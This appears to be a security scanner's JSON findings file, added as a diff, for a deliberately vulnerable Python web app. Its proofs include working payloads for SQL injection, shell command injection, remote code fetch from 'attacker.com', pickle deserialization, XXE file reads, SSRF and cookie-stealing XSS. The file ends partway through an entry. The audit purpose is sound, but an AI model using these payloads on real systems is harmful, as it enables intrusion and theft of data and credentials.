@@ -1,0 +1,803 @@
+{
+  "version": "twin-distill-flash-dsonly",
+  "results": [
+    {
+      "check_id": "twin-round/CWE-89",
+      "path": "dsvw.py",
+      "start": {
+        "line": 30
+      },
+      "end": {
+        "line": 30
+      },
+      "extra": {
+        "message": "SQL Injection in 'id' parameter",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-89"
+          ],
+          "citation": "cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])",
+          "proof": "The 'id' query parameter is extracted from the URL by the params parser at line 26 (untrusted SOURCE) and directly concatenated into the SQL query at line 30 (SINK) with no escaping. An attacker can inject arbitrary SQL via ?id=2 UNION ALL SELECT NULL,NULL,NULL,(SELECT password FROM users WHERE name='admin') to exfiltrate all data from the database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-89",
+      "path": "dsvw.py",
+      "start": {
+        "line": 67
+      },
+      "end": {
+        "line": 67
+      },
+      "extra": {
+        "message": "SQL Injection in login 'password' parameter",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-89"
+          ],
+          "citation": "cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")",
+          "proof": "The 'password' query parameter (untrusted SOURCE at line 26) is concatenated directly into the SQL query without any sanitization (SINK at line 67). While 'username' has [^\\w] filtering, 'password' is unfiltered, allowing login bypass via ?username=admin&password=' OR '1' LIKE '1. A successful login sets a valid SESSIONID cookie, granting authentication."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-89",
+      "path": "dsvw.py",
+      "start": {
+        "line": 50
+      },
+      "end": {
+        "line": 50
+      },
+      "extra": {
+        "message": "SQL Injection in 'comment' parameter (INSERT statement)",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-89"
+          ],
+          "citation": "cursor.execute(\"INSERT INTO comments VALUES(NULL, '%s', '%s')\" % (params[\"comment\"], time.ctime()))",
+          "proof": "The 'comment' query parameter (untrusted SOURCE at line 26) is interpolated via Python %-formatting into an INSERT SQL statement (SINK at line 50) with no escaping. An attacker can inject arbitrary SQL via ?comment='); DROP TABLE comments;-- to corrupt the database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-78",
+      "path": "dsvw.py",
+      "start": {
+        "line": 39
+      },
+      "end": {
+        "line": 39
+      },
+      "extra": {
+        "message": "Command Injection via 'domain' parameter with shell=True",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-78"
+          ],
+          "citation": "content = subprocess.run(\"nslookup \" + params[\"domain\"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, text=True).stdout",
+          "proof": "The 'domain' query parameter (untrusted SOURCE at line 26) is concatenated into the nslookup command string with shell=True (SINK at line 39). An attacker can execute arbitrary OS commands via ?domain=www.google.com;id and the output is returned in the HTTP response."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-94",
+      "path": "dsvw.py",
+      "start": {
+        "line": 57
+      },
+      "end": {
+        "line": 57
+      },
+      "extra": {
+        "message": "Arbitrary Code Execution via 'include' parameter fed to exec()",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-94"
+          ],
+          "citation": "exec(program, envs)",
+          "proof": "The 'include' parameter (untrusted SOURCE at line 26) controls a remote/local file fetch (line 56: urllib.request.urlopen or open) whose content is fed to Python's exec() function (SINK at line 57). An attacker can host a malicious Python payload at a URL and trigger RCE via ?include=http://attacker.com/payload.py. The output of exec() is captured via stdout redirect and returned in the response."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-502",
+      "path": "dsvw.py",
+      "start": {
+        "line": 35
+      },
+      "end": {
+        "line": 35
+      },
+      "extra": {
+        "message": "Insecure Deserialization via 'object' parameter using pickle.loads()",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-502"
+          ],
+          "citation": "content = str(pickle.loads(params[\"object\"].encode()))",
+          "proof": "The 'object' query parameter (untrusted SOURCE at line 26) is URL-decoded, encoded to bytes, and deserialized by pickle.loads() (SINK at line 35). Pickle deserialization allows arbitrary code execution via crafted payloads (e.g., cos\\nsystem\\n(S'id'\\ntR.). The server directly returns the decoded result in the HTTP response."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-611",
+      "path": "dsvw.py",
+      "start": {
+        "line": 41
+      },
+      "end": {
+        "line": 41
+      },
+      "extra": {
+        "message": "XML External Entity (XXE) Injection via 'xml' parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-611"
+          ],
+          "citation": "content = lxml.etree.tostring(lxml.etree.parse(io.BytesIO(params[\"xml\"].encode()), lxml.etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)), pretty_print=True).decode()",
+          "proof": "The 'xml' query parameter (untrusted SOURCE at line 26) is parsed by lxml with DTD loading and entity resolution ENABLED (SINK at line 41 -- load_dtd=True, resolve_entities=True, no_network=False). An attacker can read arbitrary files via ?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root> and the file contents appear in the response."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "dsvw.py",
+      "start": {
+        "line": 33
+      },
+      "end": {
+        "line": 33
+      },
+      "extra": {
+        "message": "Reflected XSS via 'v' parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "content += re.sub(r\"(v<b>)[^<]+(</b>)\", r\"\\g<1>%s\\g<2>\" % params[\"v\"], HTML_POSTFIX)",
+          "proof": "The 'v' query parameter (untrusted SOURCE at line 26) is inserted into the HTML response body via regex substitution (SINK at line 33) with no sanitization. An attacker can inject arbitrary JavaScript via ?v=0.4<script>alert(document.cookie)</script>, which executes in the victim's browser."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "dsvw.py",
+      "start": {
+        "line": 50
+      },
+      "end": {
+        "line": 50
+      },
+      "extra": {
+        "message": "Stored XSS via 'comment' parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "cursor.execute(\"INSERT INTO comments VALUES(NULL, '%s', '%s')\" % (params[\"comment\"], time.ctime()))",
+          "proof": "The 'comment' parameter (untrusted SOURCE at line 26) is stored in the SQLite comments table without sanitization (SINK at line 50) and rendered back into the HTML response unsanitized at line 53 (SELECT results inserted into <td> tags without HTML escaping). An attacker injects <script>alert(document.cookie)</script> via ?comment=..., which executes in every visitor's browser when they view /?comment=."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "dsvw.py",
+      "start": {
+        "line": 10
+      },
+      "end": {
+        "line": 10
+      },
+      "extra": {
+        "message": "DOM-based XSS via URL hash fragment (document.write)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "document.write('<div style=\"position: absolute; top: 5px; right: 5px;\">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>')",
+          "proof": "The URL hash fragment (untrusted SOURCE) after #lang= is extracted from document.location.hash and written directly to the page DOM via document.write() (SINK at line 10, in the HTML_PREFIX string). An attacker sends a victim to /?#lang=<img src=x onerror=alert(1)>. The decodeURIComponent call does NOT prevent XSS; it actually enables it by decoding %3C to < and %3E to >, allowing arbitrary HTML/JS injection."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "dsvw.py",
+      "start": {
+        "line": 65
+      },
+      "end": {
+        "line": 65
+      },
+      "extra": {
+        "message": "Reflected XSS via JSONP callback parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "content = \"%s%s%s\" % (\"\" if not \"callback\" in params else \"%s(\" % params[\"callback\"], json.dumps(dict(...)), \"\" if not \"callback\" in params else \")\")",
+          "proof": "The 'callback' query parameter (untrusted SOURCE at line 26) is reflected directly into the response body without sanitization (SINK at line 65). An attacker can exploit this via /users.json?callback=alert(document.cookie);//, producing a response that executes arbitrary JavaScript when loaded as a script tag."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-22",
+      "path": "dsvw.py",
+      "start": {
+        "line": 37
+      },
+      "end": {
+        "line": 37
+      },
+      "extra": {
+        "message": "Path Traversal via 'path' parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-22"
+          ],
+          "citation": "content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()",
+          "proof": "The 'path' query parameter (untrusted SOURCE at line 26) is passed to os.path.abspath() which does NOT resolve directory traversal -- it simply prepends the CWD, so ../../etc/passwd becomes /CWD/../../etc/passwd which normalizes to /etc/passwd. The file is then opened and returned (SINK at line 37). An attacker reads any file via ?path=../../../etc/passwd."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-918",
+      "path": "dsvw.py",
+      "start": {
+        "line": 37
+      },
+      "end": {
+        "line": 37
+      },
+      "extra": {
+        "message": "Server-Side Request Forgery via 'path' parameter",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-918"
+          ],
+          "citation": "content = (open(os.path.abspath(params[\"path\"]), \"rb\") if not \"://\" in params[\"path\"] else urllib.request.urlopen(params[\"path\"])).read().decode()",
+          "proof": "The 'path' query parameter (untrusted SOURCE) is passed to urllib.request.urlopen() (SINK) when it contains '://'. An attacker can force the server to issue arbitrary HTTP requests to internal hosts via ?path=http://169.254.169.254/latest/meta-data/ or ?path=http://127.0.0.1:631, and the response body is returned to the attacker."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-113",
+      "path": "dsvw.py",
+      "start": {
+        "line": 79
+      },
+      "end": {
+        "line": 79
+      },
+      "extra": {
+        "message": "HTTP Response Header Injection via 'charset' parameter (CRLF injection)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-113"
+          ],
+          "citation": "self.send_header(\"Content-Type\", \"%s%s\" % (\"text/html\" if content.startswith(\"<!DOCTYPE html>\") else \"text/plain\", \"; charset=%s\" % params.get(\"charset\", \"utf8\")))",
+          "proof": "The 'charset' query parameter (untrusted SOURCE) is interpolated into the Content-Type header value (SINK) without any CRLF filtering. Python's send_header does not prevent CRLF in the value. An attacker can inject arbitrary HTTP headers and response body via ?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:%20388%0D%0A%0D%0A<script>..., enabling HTTP response splitting and cache poisoning."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-643",
+      "path": "dsvw.py",
+      "start": {
+        "line": 43
+      },
+      "end": {
+        "line": 43
+      },
+      "extra": {
+        "message": "XPath Injection via 'name' parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-643"
+          ],
+          "citation": "found = lxml.etree.parse(io.BytesIO(USERS_XML.encode())).xpath(\".//user[name/text()='%s']\" % params[\"name\"])",
+          "proof": "The 'name' query parameter (untrusted SOURCE) is interpolated directly into an XPath query string via %-formatting (SINK) with no sanitization. An attacker can bypass the query and extract other users' data via ?name=' or '1'='1, or perform blind injection via ?name=admin' and substring(password/text(),1,1)='7."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-601",
+      "path": "dsvw.py",
+      "start": {
+        "line": 61
+      },
+      "end": {
+        "line": 61
+      },
+      "extra": {
+        "message": "Unvalidated Redirect via 'redir' parameter",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-601"
+          ],
+          "citation": "content = content.replace(\"<head>\", \"<head><meta http-equiv=\\\"refresh\\\" content=\\\"0; url=%s\\\"/>\" % params[\"redir\"])",
+          "proof": "The 'redir' query parameter (untrusted SOURCE) is inserted into a meta refresh URL (SINK) with no validation. An attacker can redirect victims to arbitrary external sites via ?redir=https://evil.com/phishing, enabling phishing attacks under a trusted domain."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "dsvw.py",
+      "start": {
+        "line": 47
+      },
+      "end": {
+        "line": 47
+      },
+      "extra": {
+        "message": "Denial of Service via Memory Exhaustion through 'size' parameter",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "start, _ = time.time(), \"<br>\".join(\"#\" * int(params[\"size\"]) for _ in range(int(params[\"size\"])))",
+          "proof": "The 'size' query parameter is parsed via int(params[\"size\"]) and used to allocate a string of O(n\u00b2) size. The expression \"#\" * n creates a string of length n, then the list comprehension iterates n times and join concatenates them with <br> separators. An attacker sending ?size=9999999 forces memory exhaustion, causing Python MemoryError and crashing the server."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-209",
+      "path": "dsvw.py",
+      "start": {
+        "line": 73
+      },
+      "end": {
+        "line": 73
+      },
+      "extra": {
+        "message": "Information Exposure via Full Python Traceback in Error Responses",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-209"
+          ],
+          "citation": "content = ex.output if isinstance(ex, subprocess.CalledProcessError) else traceback.format_exc()",
+          "proof": "When any exception occurs inside do_GET (e.g., ?path=foobar triggers FileNotFoundError, or malformed input triggers ValueError), the full Python traceback including absolute file paths, source code lines, and internal variable values is returned to the client via traceback.format_exc(), leaking server internals."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "dsvw.py",
+      "start": {
+        "line": 11
+      },
+      "end": {
+        "line": 11
+      },
+      "extra": {
+        "message": "Hard-coded Plaintext Passwords in Source Code",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "USERS_XML = \"\"\"<?xml version=\"1.0\" encoding=\"utf-8\"?><users><user id=\"0\"><username>admin</username><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user><user id=\"1\"><username>dricci</username><name>dian</name><surname>ricci</surname><password>12345</password></user><user id=\"2\"><username>amason</username><name>anthony</name><surname>mason</surname><password>gandalf</password></user><user id=\"3\"><username>svargas</username><name>sandra</name><surname>vargas</surname><password>phest1945</password></user></users>\"\"\"",
+          "proof": "Four user accounts (admin, dricci, amason, svargas) have their plaintext passwords hardcoded in the USERS_XML string at module level. These credentials are embedded in source code, accessible to anyone who can read the file (e.g., via the path traversal at line 38, or repository access)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "dsvw.py",
+      "start": {
+        "line": 51
+      },
+      "end": {
+        "line": 51
+      },
+      "extra": {
+        "message": "Cross-Site Request Forgery on Comment Submission",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "cursor.execute(\"INSERT INTO comments VALUES(NULL, '%s', '%s')\" % (params[\"comment\"], time.ctime()))",
+          "proof": "The comment endpoint performs a state-changing operation (INSERT into comments table) via HTTP GET without any CSRF token, origin header check, or referer validation. An attacker can craft <img src=\"http://target/?comment=spam\"> to force a victim's browser to insert comments cross-origin."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1021",
+      "path": "dsvw.py",
+      "start": {
+        "line": 76
+      },
+      "end": {
+        "line": 76
+      },
+      "extra": {
+        "message": "Missing X-Frame-Options Header Enabling Clickjacking",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1021"
+          ],
+          "citation": "self.send_response(code)\n            self.send_header(\"Connection\", \"close\")\n            self.send_header(\"X-XSS-Protection\", \"0\")\n            self.send_header(\"Content-Type\", \"%s%s\" % (\"text/html\" if content.startswith(\"<!DOCTYPE html>\") else \"text/plain\", \"; charset=%s\" % params.get(\"charset\", \"utf8\")))\n            self.end_headers()",
+          "proof": "The HTTP response headers set Connection, X-XSS-Protection, and Content-Type, but critically omit X-Frame-Options (and Content-Security-Policy frame-ancestors). Without these headers, any page can be embedded in an <iframe> on an attacker-controlled site, enabling clickjacking attacks."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-338",
+      "path": "dsvw.py",
+      "start": {
+        "line": 68
+      },
+      "end": {
+        "line": 68
+      },
+      "extra": {
+        "message": "Weak PRNG for Session ID Generation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-338"
+          ],
+          "citation": "\"\".join(random.sample(string.ascii_letters + string.digits, 20))",
+          "proof": "Session IDs are generated using random.sample() from Python's random module, which uses the Mersenne Twister PRNG \u2014 not cryptographically secure. An attacker observing multiple session IDs can predict future values, enabling session hijacking."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "dsvw.py",
+      "start": {
+        "line": 67
+      },
+      "end": {
+        "line": 67
+      },
+      "extra": {
+        "message": "Cross-Site Request Forgery on Login Endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\"><meta http-equiv=\\\"refresh\\\" content=\\\"1; url=/\\\"/>\" % (re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")), \"\".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else \"The username and/or password is incorrect<meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\\\">\"",
+          "proof": "The /login endpoint sets a SESSIONID cookie via HTTP GET with zero CSRF protection \u2014 no token, no origin/referrer check, no SameSite attribute. An attacker can forge a URL like /login?username=admin&password=... and embed it in an <img> or <script> tag. A victim visiting the crafted page is silently logged in with attacker-chosen credentials."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-614",
+      "path": "dsvw.py",
+      "start": {
+        "line": 68
+      },
+      "end": {
+        "line": 68
+      },
+      "extra": {
+        "message": "Session Cookie Missing Secure / HttpOnly / SameSite Attributes",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-614"
+          ],
+          "citation": "content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\">...\"",
+          "proof": "The SESSIONID cookie is injected via <meta http-equiv=\"Set-Cookie\"> HTML tag with only path=/ set. No Secure flag (cookie sent over unencrypted HTTP), no HttpOnly flag (accessible to JavaScript via document.cookie), and no SameSite flag (sent on cross-origin requests). An attacker who achieves XSS can steal the session cookie directly, and the cookie is transmitted in cleartext over HTTP."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "dsvw.py",
+      "start": {
+        "line": 67
+      },
+      "end": {
+        "line": 67
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Login Endpoint Enables Brute-Force Attack",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")",
+          "proof": "The /login endpoint (line 66-68) accepts user-supplied username and password parameters and executes a SQL query with zero throttling, account lockout, CAPTCHA, or delay mechanism. An attacker can fire thousands of requests per second against the endpoint, enumerated by observing the 'Welcome <b>...</b>' success response vs 'The username and/or password is incorrect' failure response. Since passwords are stored in plaintext in USERS_XML (e.g. admin:7en8aiDoh!, dricci:12345), successful brute-force yields immediate account compromise."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-693",
+      "path": "dsvw.py",
+      "start": {
+        "line": 77
+      },
+      "end": {
+        "line": 77
+      },
+      "extra": {
+        "message": "X-XSS-Protection Header Explicitly Disabled",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-693"
+          ],
+          "citation": "self.send_header(\"X-XSS-Protection\", \"0\")",
+          "proof": "Every HTTP response from the server includes the header X-XSS-Protection: 0 (line 77, in the finally block), which explicitly disables the browser's built-in reflected XSS filter. This is a security misconfiguration that removes a defense-in-depth layer, increasing the exploitability of the multiple reflected XSS vulnerabilities present in the application (e.g. the 'v' parameter XSS at line 33, the JSONP callback XSS at line 65)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-306",
+      "path": "dsvw.py",
+      "start": {
+        "line": 24
+      },
+      "end": {
+        "line": 24
+      },
+      "extra": {
+        "message": "No Authentication Validation on Any Endpoint (Session Cookie Never Verified)",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-306"
+          ],
+          "citation": "def do_GET(self):\n        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, \"\")\n        code, content, params, cursor = http.client.OK, HTML_PREFIX, dict(...)",
+          "proof": "The login endpoint at line 67-68 generates a SESSIONID token and sets it as a cookie, but the do_GET handler at line 24 (and every downstream path handler) never reads self.headers, never checks for a Cookie header, and never validates the session token. There is zero authentication enforcement \u2014 every endpoint (/users.json, /login, /?id=..., /?comment=..., /?name=..., /?path=..., /?domain=...) is accessible to unauthenticated attackers. The SESSIONID cookie is purely decorative."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-312",
+      "path": "dsvw.py",
+      "start": {
+        "line": 67
+      },
+      "end": {
+        "line": 67
+      },
+      "extra": {
+        "message": "Plaintext Password Comparison in SQL Query (No Hashing)",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-312"
+          ],
+          "citation": "cursor.execute(\"SELECT * FROM users WHERE username='\" + re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")) + \"' AND password='\" + params.get(\"password\", \"\") + \"'\")",
+          "proof": "The login query compares the user-supplied password directly against the stored password in the SQL WHERE clause: password='...'. There is zero hashing \u2014 no bcrypt, no PBKDF2, no SHA-256, no salt. The database at line 19 stores passwords as plain TEXT, and USERS_XML at line 11 embeds them in plaintext (e.g. admin:7en8aiDoh!, dricci:12345). This violates CWE-312 (Cleartext Storage of Sensitive Information) and means any SQL injection or database breach leaks usable credentials immediately."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1327",
+      "path": "Dockerfile",
+      "start": {
+        "line": 19
+      },
+      "end": {
+        "line": 19
+      },
+      "extra": {
+        "message": "Application Bound to All Network Interfaces (0.0.0.0)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-1327"
+          ],
+          "citation": "RUN sed -i 's/127.0.0.1/0.0.0.0/g' dsvw.py",
+          "proof": "The Dockerfile at line 19 performs a sed replacement that changes the LISTEN_ADDRESS from '127.0.0.1' (localhost-only) to '0.0.0.0' (all network interfaces). Combined with docker-compose.yml mapping port 65412:65412, the vulnerable application becomes accessible to any machine that can reach the Docker host. This expands the attack surface from local-only to network-wide, enabling remote attackers to exploit every other vulnerability (SQLi, RCE, SSRF, XXE, path traversal, etc.) over the network."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "dsvw.py",
+      "start": {
+        "line": 30
+      },
+      "end": {
+        "line": 30
+      },
+      "extra": {
+        "message": "IDOR \u2014 User Profile Access via 'id' Parameter Without Authorization",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "cursor.execute(\"SELECT id, username, name, surname FROM users WHERE id=\" + params[\"id\"])",
+          "proof": "Untrusted SOURCE: params['id'] from URL query string. SINK: SQL SELECT returning any user's full profile (id, username, name, surname). No authentication or ownership check is performed; changing ?id=1 reveals dricci's data, ?id=0 reveals the admin user's data."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "dsvw.py",
+      "start": {
+        "line": 43
+      },
+      "end": {
+        "line": 43
+      },
+      "extra": {
+        "message": "IDOR \u2014 User Surname Lookup via 'name' Parameter Without Authorization",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "found = lxml.etree.parse(io.BytesIO(USERS_XML.encode())).xpath(\".//user[name/text()='%s']\" % params[\"name\"])",
+          "proof": "Untrusted SOURCE: params['name'] from URL query string. SINK: XPath query returning any user's surname from the XML user store. No authentication check; any client can look up any user's surname by supplying a known name value (e.g. ?name=admin reveals 'admin', ?name=dian reveals 'ricci'). Combined with the /users.json endpoint (line 65) which leaks all usernames, an attacker can enumerate all surnames."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "dsvw.py",
+      "start": {
+        "line": 65
+      },
+      "end": {
+        "line": 65
+      },
+      "extra": {
+        "message": "Sensitive Data Exposure \u2014 /users.json Returns All Usernames and Surnames Without Authentication",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "content = \"%s%s%s\" % (\"\" if not \"callback\" in params else \"%s(\" % params[\"callback\"], json.dumps(dict((_.findtext(\"username\"), _.findtext(\"surname\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\"))), \"\" if not \"callback\" in params else \")\")",
+          "proof": "Untrusted SOURCE: any unauthenticated GET request to /users.json. SINK: JSON response containing all usernames and surnames (PII) of every user in the system, returned with no authentication, authorization, or rate limiting. The endpoint also accepts a 'callback' parameter enabling JSONP, which introduces an additional reflected XSS vector."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-16",
+      "path": "dsvw.py",
+      "start": {
+        "line": 77
+      },
+      "end": {
+        "line": 77
+      },
+      "extra": {
+        "message": "Security Misconfiguration \u2014 X-XSS-Protection Header Explicitly Disabled",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-16"
+          ],
+          "citation": "self.send_header(\"X-XSS-Protection\", \"0\")",
+          "proof": "The server explicitly sends X-XSS-Protection: 0 on every response (line 77 in the finally block), deliberately disabling the browser's built-in reflected-XSS auditor. This is a security misconfiguration (CWE-16: Configuration) that removes a defense-in-depth layer which could mitigate some reflected XSS attacks. This is issued on every response regardless of content type."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-306",
+      "path": "dsvw.py",
+      "start": {
+        "line": 68
+      },
+      "end": {
+        "line": 68
+      },
+      "extra": {
+        "message": "Missing Authentication \u2014 SESSIONID Cookie Set but Never Validated; All Endpoints Accessible Without Login",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-306"
+          ],
+          "citation": "content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\">...\" % (...)",
+          "proof": "SOURCE: login at line 67-68 generates and sets a SESSIONID cookie on successful authentication. SINK: nowhere in do_GET or any request handler is this cookie read from the request headers or validated against any session store. Every endpoint (/?id=, /?name=, /?comment=, /?path=, /?domain=, /users.json, etc.) is accessible with no session check whatsoever. The SESSIONID token is purely ornamental \u2014 there is zero authentication enforcement."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-799",
+      "path": "dsvw.py",
+      "start": {
+        "line": 50
+      },
+      "end": {
+        "line": 50
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Comment Submission Enables Comment Spam and DoS Amplification",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-799"
+          ],
+          "citation": "cursor.execute(\"INSERT INTO comments VALUES(NULL, '%s', '%s')\" % (params[\"comment\"], time.ctime()))",
+          "proof": "SOURCE: The `comment` parameter is extracted from the untrusted query string via `params` dict (line 26, regex parsing of `self.path`). SINK: The value is inserted directly into the `comments` table via `cursor.execute()` at line 50 with NO rate-limiting gate, no per-IP tracking, no throttling, and no authentication requirement. An attacker can fire unlimited `/?comment=X` requests to fill the in-memory SQLite database, amplify the unbounded-read DoS, and persist arbitrary content."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "dsvw.py",
+      "start": {
+        "line": 68
+      },
+      "end": {
+        "line": 68
+      },
+      "extra": {
+        "message": "Insufficient Session Expiration \u2014 Successful Login Sets SESSIONID Without Max-Age or Expires",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "content += \"Welcome <b>%s</b><meta http-equiv=\\\"Set-Cookie\\\" content=\\\"SESSIONID=%s; path=/\\\">...\" % (re.sub(r\"[^\\w]\", \"\", params.get(\"username\", \"\")), \"\".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else \"...\"",
+          "proof": "SOURCE: The login success path (line 68) sets `SESSIONID=<random>; path=/` with NO `Max-Age` or `Expires` attribute. SINK: The cookie is emitted via `<meta http-equiv=\"Set-Cookie\">` into the HTTP response body, and subsequent requests present it in the `Cookie` header (though CWE-306 notes the server never validates it). Without an expiry, a captured token remains valid indefinitely in the user's browser until manually cleared. Additionally, no server-side session store exists, so there is zero revocation capability \u2014 no logout endpoint, no password-change invalidation, no timeout."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-525",
+      "path": "dsvw.py",
+      "start": {
+        "line": 76
+      },
+      "end": {
+        "line": 76
+      },
+      "extra": {
+        "message": "Session Token Exposed in Cacheable HTTP Response Body",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-525"
+          ],
+          "citation": "self.send_header(\"Connection\", \"close\")\n            self.send_header(\"X-XSS-Protection\", \"0\")\n            self.send_header(\"Content-Type\", \"%s%s\" % (\"text/html\" if content.startswith(\"<!DOCTYPE html>\") else \"text/plain\", \"; charset=%s\" % params.get(\"charset\", \"utf8\")))\n            self.end_headers()",
